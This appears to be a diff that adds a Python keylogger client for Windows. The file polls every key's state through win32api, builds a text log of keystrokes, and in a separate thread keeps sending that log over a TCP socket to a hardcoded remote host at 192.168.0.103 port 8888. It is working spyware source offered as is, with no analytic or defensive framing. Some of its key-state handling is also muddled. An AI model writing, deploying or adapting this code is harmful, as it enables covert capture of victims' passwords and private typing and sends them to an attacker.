@@ -1,0 +1,70 @@
+import socket
+import win32api
+import win32con
+import time
+import threading
+
+class KeyLoggerClient:
+    def __init__(self, server_host, server_port, interval):
+        self.server_host = server_host
+        self.server_port = server_port
+        self.interval = interval
+        self.log = ""
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def get_key_state(self, key):
+        key_state = win32api.GetAsyncKeyState(key)
+        return key_state
+
+    def get_key_name(self, key):
+        if key == 0x08:  # Backspace
+            return '[BACKSPACE]'
+        elif key == 0x09:  # Tab
+            return '[TAB]'
+        elif key == 0x0D:  # Enter
+            return '[ENTER]\n'
+        elif key == 0x10:  # Shift
+            return '[SHIFT]'
+        elif key == 0x11:  # Ctrl
+            return '[CTRL]'
+        elif key == 0x12:  # Alt
+            return '[ALT]'
+        elif key == 0x14:  # Caps Lock
+            return '[CAPS_LOCK]'
+        elif key == 0x20:  # Space
+            return ' '
+        else:
+            return chr(key)
+
+    def log_keys(self):
+        while True:
+            for key in range(0x01, 0xFF):
+                key_state = self.get_key_state(key)
+                if key_state & 0x8000:  # Key is down
+                    key_name = self.get_key_name(key)
+                    self.log += key_name
+                elif key_state & 0x0001:  # Key is up
+                    key_name = self.get_key_name(key)
+                    self.log += f"{key_name}"
+                elif key_state & 0x0002:  # Key is extended
+                    key_name = self.get_key_name(key)
+                    self.log += f"[EXTENDED]{key_name}"
+
+            time.sleep(0.1)
+
+    def send_logs(self):
+        while True:
+            self.client_socket.send(self.log.encode())
+            self.log = ""
+            time.sleep(0.1)
+
+    def start(self):
+        self.client_socket.connect((self.server_host, self.server_port))
+        key_logger_thread = threading.Thread(target=self.log_keys)
+        sender_thread = threading.Thread(target=self.send_logs)
+        key_logger_thread.start()
+        sender_thread.start()
+
+if __name__ == "__main__":
+    key_logger = KeyLoggerClient(server_host="192.168.0.103", server_port=8888, interval=1)
+    key_logger.start()
